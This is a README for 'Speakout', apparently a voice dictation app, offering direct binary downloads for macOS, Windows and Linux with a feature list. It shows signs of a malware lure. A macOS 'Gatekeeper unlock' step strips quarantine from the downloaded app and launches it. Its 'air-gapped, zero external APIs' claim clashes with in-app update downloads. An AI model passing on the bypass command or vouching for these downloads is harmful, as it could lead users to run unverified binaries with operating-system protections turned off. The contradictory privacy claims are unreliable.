# Speakout v8.3.2 — Local Voice Dictation & Prompt Intelligence for macOS, Windows & Linux 🎙️

Speakout v8.3.2 is an ultra-fast, local-first, GPU-accelerated voice dictation and prompt engineering instrument for **macOS laptops**, **Windows laptops**, and **Linux laptops**.

[![Latest Release](https://img.shields.io/badge/Release-v8.3.2_Stable-blue.svg)](https://github.com/codesource18/speakout-downloads/releases/tag/v8.3.2)
[![macOS](https://img.shields.io/badge/Platform-macOS_(Apple_Silicon_%26_Intel)-black.svg)](https://github.com/codesource18/speakout-downloads)
[![Windows](https://img.shields.io/badge/Platform-Windows_10_%2F_11_(x64)-0078D6.svg)](https://github.com/codesource18/speakout-downloads)
[![Linux](https://img.shields.io/badge/Platform-Linux_(AppImage_%2F_Deb)-FCC624.svg)](https://github.com/codesource18/speakout-downloads)
[![License](https://img.shields.io/badge/License-MIT-green.svg)](LICENSE)

---

## 📦 Direct Downloads by Operating System

### 🍎 1. macOS (Apple Silicon M1 / M2 / M3 / M4 & Intel)
- **[Speakout-v8.3.2-apple-silicon.dmg](https://github.com/codesource18/speakout-downloads/raw/refs/heads/main/Speakout-v8.3.2-apple-silicon.dmg)** (5.03 MB)
- **Compatibility**: macOS 12 Monterey, macOS 13 Ventura, macOS 14 Sonoma, macOS 15 Sequoia
- **Quick Gatekeeper Unlock**:
  ```bash
  xattr -cr /Applications/Speakout.app && open /Applications/Speakout.app
  ```

### 🪟 2. Windows (Windows 10 / Windows 11 64-bit)
- **[Speakout-v8.3.2-windows-x64.msi](https://github.com/codesource18/speakout-downloads/releases/download/v8.3.2/Speakout_8.3.2_x64_en-US.msi)** (Installer)
- **[Speakout-v8.3.2-windows-portable.zip](https://github.com/codesource18/speakout-downloads/releases/download/v8.3.2/Speakout-v8.3.2-windows-portable.zip)** (Portable Standalone)
- **Compatibility**: Windows 10 (1809+) and Windows 11 (All editions)
- **Default Hotkey**: `Alt + Space` or `Ctrl + Shift + Space` (Customizable in Settings)

### 🐧 3. Linux (Ubuntu, Debian, Fedora, Arch, Pop!_OS)
- **[Speakout-v8.3.2-linux-x86_64.AppImage](https://github.com/codesource18/speakout-downloads/releases/download/v8.3.2/Speakout_8.3.2_amd64.AppImage)** (Universal Standalone)
- **[Speakout-v8.3.2-linux-amd64.deb](https://github.com/codesource18/speakout-downloads/releases/download/v8.3.2/speakout_8.3.2_amd64.deb)** (Debian / Ubuntu Package)
- **Run Standalone AppImage**:
  ```bash
  chmod +x Speakout_8.3.2_amd64.AppImage && ./Speakout_8.3.2_amd64.AppImage
  ```

---

## ⚡ What's New in v8.3.2

1. **The Professional Prompt Framework**:
   - **Role (Persona)**: Automatically infers expert persona across Game Dev, Full-Stack, Systems Engineering, AI/ML, Quantitative Finance, Copywriting, and UI/UX Design.
   - **Context**: Ingests background situation and target audience from speech.
   - **Task (Instruction)**: Extracts strong imperative action verbs (`Build`, `Create`, `Write`, `Refactor`, `Analyze`, `Design`, `Summarize`).
   - **Requirements & Key Features**: Clean numbered stepwise specifications from spoken sequential clauses (`"first..."`, `"second..."`, `"then..."`, `"also..."`).
   - **Constraints (Rules)**: Captures boundaries (`"without external dependencies"`, `"strictly avoid"`, `"under 2GB RAM"`, `"lightweight"`).
   - **Format**: Output specification for production-ready code.

2. **Smart Routing & Fast Path**:
   - Spoken thoughts of 2 sentences or less pass directly as clean text without prompting overhead.
   - Spoken multi-step ideas are synthesized deterministically in < 1ms.

3. **God-Level Sub-2s Latency**:
   - Apple Silicon Metal GPU acceleration on Mac, AVX2/OpenMP multi-threaded acceleration on Windows and Linux.
   - Direct text insertion into focused apps (Cursor, VS Code, Slack, Chrome, Antigravity, Notes, Word).

4. **Background Resident Tray Mode**:
   - Tray icon remains active in menu bar / system tray across macOS, Windows, and Linux.
   - Pressing your global hotkey anywhere immediately starts voice recognition.

5. **In-App Direct Updates**:
   - Check for updates directly inside Speakout settings.
   - Native OS notifications (macOS Notification Center, Windows Toast Notifications, Linux `notify-send`).
   - One-click in-place update download and auto-relaunch.

---

## 🔒 100% On-Device Privacy Boundary

- **Zero Cloud Exfiltration**: Audio buffers are processed purely in local RAM and immediately discarded.
- **Air-Gapped**: Zero external cloud APIs, zero third-party telemetry, zero tracking beacons.
- **Ultra-Low Memory Footprint**: Strictly under 120 MB RAM usage (no heavy background server daemons).
- **Local SQLite Persistence**: History, vocabulary, and custom skills stored locally on your machine.
